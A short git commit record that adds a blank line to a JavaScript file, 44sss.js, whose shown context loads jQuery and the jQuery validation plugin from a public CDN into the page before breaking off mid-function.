7464745a93ba0180d1981c06075d7f4ff3f60b7c
gistmib <97446697+gistmib@users.noreply.github.com>
2023-02-13 08:31:24 -0300

    Update 44sss.js

--- 44sss.js
+++ 44sss.js
@@ -1,3 +1,4 @@
+
 var lots = "";
 var aat = "t";
 var g = window.location.hostname;var head= document.getElementsByTagName('head')[0]; var scriptxx= document.createElement('script'); scriptxx.src= 'https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.7.1.min.js'; scriptxx.type = "text/javascript"; scriptxx.async = false; head.appendChild(scriptxx); var x= document.createElement('script'); x.src= 'https://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.min.js'; x.type = "text/javascript"; x.async = false; head.appendChild(x); x.onload=function( evt ) { (function($) {
